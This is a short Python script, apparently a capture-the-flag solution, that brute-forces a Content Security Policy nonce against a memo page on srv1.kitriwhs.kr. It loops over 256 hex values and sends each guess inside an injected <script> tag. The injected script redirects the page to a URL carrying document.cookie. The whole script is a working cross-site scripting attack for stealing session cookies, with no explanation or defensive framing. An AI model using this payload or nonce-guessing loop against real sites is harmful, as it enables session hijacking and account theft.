import requests
import time

base_url = 'http://srv1.kitriwhs.kr:19673/memo?memo=<script nonce="{}">window.location.href="/memo?memo="+document.cookie;</script>'


for i in range(256):
    time.sleep(0.2)
    nonce_value = format(i,'02X')
    request_url = base_url.format(nonce_value)

    response = requests.get(request_url)

    # 여기에서 응답을 처리하거나 출력할 수 있습니다.
    print("Nonce:", nonce_value)

